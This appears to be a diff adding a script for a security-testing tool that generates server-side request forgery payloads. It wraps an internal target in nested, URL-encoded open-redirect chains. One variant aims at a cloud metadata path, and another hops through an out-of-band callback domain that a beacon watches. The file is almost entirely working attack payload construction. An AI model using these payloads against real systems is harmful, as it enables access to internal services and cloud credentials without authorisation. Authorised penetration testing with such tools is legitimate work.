@@ -1,0 +1,20 @@
+# Vars: base, redirect_base, internal, oast, token
+let t = token ?? "0"
+let path = "/fluxion/chain"
+let b = oast_beacon sub=t domain=oast path=path q={ tool:"fluxion", mode:"chain" }
+
+let v1 = join(base, url_encode(join(redirect_base, url_encode(internal))))
+let v2 = join(base, url_encode(join(redirect_base, url_encode(join(internal, "latest/meta-data/")))))
+let v3 = join(base, url_encode(join(redirect_base, url_encode(join(redirect_base, url_encode(internal))))))
+let hop = join("http://", t, ".", oast, "/fluxion/hop?to=", url_encode(internal))
+let v4 = join(base, url_encode(join(redirect_base, url_encode(hop))))
+
+let payloads = [v1, v2, v3, v4]
+
+echo value=jsonify({
+  beacon: b,
+  payloads: payloads,
+  sample_probes: [v1]
+})
+
+return len(payloads)
